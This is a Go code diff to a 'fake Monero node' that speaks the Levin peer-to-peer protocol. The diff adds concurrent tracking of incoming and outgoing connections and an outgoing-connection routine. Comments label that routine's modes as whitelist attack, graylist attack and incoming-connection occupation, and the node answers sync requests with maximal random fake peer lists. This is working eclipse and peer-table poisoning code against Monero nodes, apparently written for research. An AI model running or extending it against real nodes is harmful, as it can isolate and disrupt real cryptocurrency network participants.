@@ -9,24 +9,28 @@ import (
 	"net"
 	"os"
 	"strconv"
-	"time"
+	"sync"
 )
 
 // 虚拟的门罗币节点
 type Node struct {
-	my_port    uint32
-	network_id []byte
-	peer_id    uint64
-	listener   net.Listener
+	my_port        uint32
+	network_id     []byte
+	peer_id        uint64
+	listener       net.Listener
+	in_peers       map[net.Conn]bool
+	in_peers_lock  sync.Mutex
+	out_peers      map[net.Conn]bool
+	out_peers_lock sync.Mutex
 }
 
-func CreateNode(network_type string, listen_port uint32) Node {
+func CreateNode(network_type string, listen_port uint32) *Node {
 	// 生成peer_id
 	max := new(big.Int).Lsh(big.NewInt(1), 64)
 	random_num, err := rand.Int(rand.Reader, max)
 	if err != nil {
 		fmt.Println("Error generating random peer_id: ", err)
-		return Node{}
+		return nil
 	}
 	// 确定network_id
 	var network_id []byte
@@ -42,8 +46,10 @@ func CreateNode(network_type string, listen_port uint32) Node {
 		my_port:    listen_port,
 		network_id: network_id,
 		peer_id:    random_num.Uint64(),
+		in_peers:   make(map[net.Conn]bool),
+		out_peers:  make(map[net.Conn]bool),
 	}
-	return node
+	return &node
 }
 
 func (node *Node) Start() {
@@ -53,72 +59,43 @@ func (node *Node) Start() {
 	// 1. 创建监听器
 	var err error
 	node.listener, err = net.Listen("tcp", ":"+strconv.Itoa(int(node.my_port)))
-	defer node.listener.Close()
 	if err != nil {
 		log.Println("Error create listener: ", err)
 		os.Exit(1)
 	}
 	fmt.Println("Node Server is listening on port " + strconv.Itoa(int(node.my_port)))
 
-	// 2. 使用协程循环接收连接请求
-	go func() {
-		for {
-			conn, err := node.listener.Accept()
-			if err != nil {
-				fmt.Println("Error accepting connection:", err)
-				continue
-			}
+	// 2. 使用协程处理传入连接请求
+	go node.acceptIncomingConnection()
+}
 
-			// 3. 并发处理连接
-			go node.handleIncomingConnection(&conn)
-		}
-	}()
+func (node *Node) Stop() {
+	node.listener.Close()
+}
 
-	// 3. 节点接收命令
-	var command string
+func (node *Node) acceptIncomingConnection() {
 	for {
-		time.Sleep(1e8)
-		fmt.Println("+==================================+")
-		fmt.Println("|                                  |")
-		fmt.Println("|         Fake Monero Node         |")
-		fmt.Println("|                                  |")
-		// fmt.Println("|-----------====INFO====-----------|")
-		// fmt.Printf("| my_port:      %5d           |\n", node.my_port)
-		// fmt.Printf("| peer_id:      %5s...        |\n", string(node.peer_id))
-		// fmt.Printf("| network_type: %5s...        |\n", string(node.network_id))
-		fmt.Println("+============= Command ============+")
-		fmt.Println("| 1. Connect to a target node.     |")
-		fmt.Println("| 0. Exit                          |")
-		fmt.Println("+==================================+")
-		fmt.Print("Your Command: ")
-		fmt.Scanln(&command)
-		switch command {
-		case "1": // 和目标节点发起连接
-			fmt.Print("Target IP: ")
-			var target_ip string
-			fmt.Scanln(&target_ip)
-			fmt.Print("Target Port: ")
-			var target_port uint16
-			fmt.Scanln(&target_port)
-			node.setOutgoingConnection(target_ip, target_port)
-		case "0":
-			return
-		default:
-			fmt.Println("Unknown command, please try again.")
+		conn, err := node.listener.Accept()
+		fmt.Println("Accept")
+		if err != nil {
+			fmt.Println("Error accepting connection:", err)
+			os.Exit(0)
 		}
-		// node.setOutgoingConnection("100.116.72.96", 38080)
+
+		// 3. 并发处理连接
+		go node.handleIncomingConnection(conn)
 	}
 }
 
-func (node *Node) handleIncomingConnection(conn *net.Conn) {
-	defer (*conn).Close()
+func (node *Node) handleIncomingConnection(conn net.Conn) {
+	defer node.dropIncommingConnection(conn)
 	// fmt.Println("Accept incoming connection from " + (*conn).RemoteAddr().String())
 
 	for {
 		// 读消息
 		msg := levin.LevinProtocolMessage{}
-		res := msg.ReadBuffer(conn)
-		if !res {
+		err := msg.ReadBuffer(conn)
+		if err != nil {
 			return
 		}
 
@@ -128,12 +105,14 @@ func (node *Node) handleIncomingConnection(conn *net.Conn) {
 				response_msg := levin.LevinProtocolMessage{}
 				response_msg.CreateHandshakeResponse(node.my_port, node.network_id, node.peer_id, nil)
 				data_to_send := append(response_msg.HeaderBytes(), response_msg.PayloadBytes()...)
-				_, err := (*conn).Write(data_to_send)
+				_, err := conn.Write(data_to_send)
 				if err != nil {
 					log.Println("Error sending data:", err)
 					return
 				} else {
 					fmt.Println("Handshake response sent!")
+					// 成功接受传入连接，将传入连接记录下来
+					node.recordIncomingConnection(conn)
 				}
 			} else {
 				fmt.Println("Receive Handshake response!")
@@ -145,7 +124,7 @@ func (node *Node) handleIncomingConnection(conn *net.Conn) {
 				response_msg := levin.LevinProtocolMessage{}
 				response_msg.CreatePongResponse(node.peer_id)
 				data_to_send := append(response_msg.HeaderBytes(), response_msg.PayloadBytes()...)
-				_, err := (*conn).Write(data_to_send)
+				_, err := conn.Write(data_to_send)
 				if err != nil {
 					log.Println("Error sending data:", err)
 					return
@@ -160,9 +139,9 @@ func (node *Node) handleIncomingConnection(conn *net.Conn) {
 		if msg.GetCommand() == levin.CommandTimedSync {
 			if msg.GetExpectResponse() {
 				response_msg := levin.LevinProtocolMessage{}
-				response_msg.CreateTimedSyncResponse(node.my_port, node.network_id, node.peer_id, generateRamdomPeerlist(250))
+				response_msg.CreateTimedSyncResponse(node.my_port, node.network_id, node.peer_id, generateRamdomPeerlist(levin.MaxPeerlistEntryNum))
 				data_to_send := append(response_msg.HeaderBytes(), response_msg.PayloadBytes()...)
-				_, err := (*conn).Write(data_to_send)
+				_, err := conn.Write(data_to_send)
 				if err != nil {
 					log.Println("Error sending data:", err)
 					return
@@ -177,15 +156,15 @@ func (node *Node) handleIncomingConnection(conn *net.Conn) {
 	}
 }
 
-func (node *Node) setOutgoingConnection(target_ip string, target_port uint16) {
+// disconnect表示是否在连接建立完成后立刻断开连接
+func (node *Node) EstablishOutgoingConnection(ip string, port uint16, disconnect_immediately bool) error {
 	// 建立tcp连接
-	address := target_ip + ":" + strconv.Itoa(int(target_port))
+	address := ip + ":" + strconv.Itoa(int(port))
 	conn, err := net.Dial("tcp", address)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "Fail to connect to target %s: %v\n", address, err)
-		return
+		return err
 	}
-	defer conn.Close()
 	// fmt.Printf("Successfully connect to target %s\n", address)
 	// 发送握手请求
 	request_msg := levin.LevinProtocolMessage{}
@@ -194,24 +173,71 @@ func (node *Node) setOutgoingConnection(target_ip string, target_port uint16) {
 	_, err = conn.Write(data_to_send)
 	if err != nil {
 		log.Println("Error sending data:", err)
-		return
+		return err
 	} else {
 		fmt.Println("Handshake request sent!")
 	}
+	// 此时monero传出连接已经建立，将连接加入到node的记录中
+	node.recordOutgoingConnection(conn)
 	// 循环接收对端的响应
-	for {
-		// 读消息
-		msg := levin.LevinProtocolMessage{}
-		res := msg.ReadBuffer(&conn)
-		if !res {
-			return
-		}
+	go func() {
+		defer node.dropOutgoingConnection(conn)
+		for {
+			// 读消息
+			msg := levin.LevinProtocolMessage{}
+			err := msg.ReadBuffer(conn)
+			if err != nil {
+				return
+			}
 
-		// 处理Handshake响应消息
-		if msg.GetCommand() == levin.CommandHandshake && !msg.GetExpectResponse() {
-			return
+			// 处理Handshake响应消息
+			if msg.GetCommand() == levin.CommandHandshake && !msg.GetExpectResponse() {
+				// 是否立刻断开连接
+				if disconnect_immediately {
+					break // 立刻断开连接：whitelist attack
+				}
+				// 否则，不断开连接：graylist attack和传入连接占领
+			}
+			if msg.GetCommand() == levin.CommandTimedSync {
+				// timed sync 请求
+				if msg.GetExpectResponse() {
+					response_msg := levin.LevinProtocolMessage{}
+					response_msg.CreateTimedSyncResponse(node.my_port, node.network_id, node.peer_id, generateRamdomPeerlist(levin.MaxPeerlistEntryNum))
+				}
+			}
 		}
-	}
+	}()
+	return nil
+}
+
+// 传入连接建立后的处理
+func (node *Node) recordIncomingConnection(conn net.Conn) {
+	node.in_peers_lock.Lock()
+	node.in_peers[conn] = true
+	node.in_peers_lock.Unlock()
+}
+
+// 传出连接建立后的处理
+func (node *Node) recordOutgoingConnection(conn net.Conn) {
+	node.out_peers_lock.Lock()
+	node.out_peers[conn] = true
+	node.out_peers_lock.Unlock()
+}
+
+// 传入连接断开的后处理
+func (node *Node) dropIncommingConnection(conn net.Conn) {
+	node.in_peers_lock.Lock()
+	delete(node.in_peers, conn)
+	defer conn.Close()
+	node.in_peers_lock.Unlock()
+}
+
+// 传出连接断开的后处理
+func (node *Node) dropOutgoingConnection(conn net.Conn) {
+	node.out_peers_lock.Lock()
+	delete(node.out_peers, conn)
+	defer conn.Close()
+	node.out_peers_lock.Unlock()
 }
 
 /*
@@ -222,8 +248,8 @@ func (node *Node) setOutgoingConnection(target_ip string, target_port uint16) {
 =============
 */
 func generateRamdomPeerlist(num_of_peer int) []levin.PeerlistEntry {
-	if num_of_peer > 250 {
-		num_of_peer = 250
+	if num_of_peer > levin.MaxPeerlistEntryNum {
+		num_of_peer = levin.MaxPeerlistEntryNum
 	}
 	peerlist := make([]levin.PeerlistEntry, num_of_peer)
 	max := new(big.Int).Lsh(big.NewInt(1), 64)
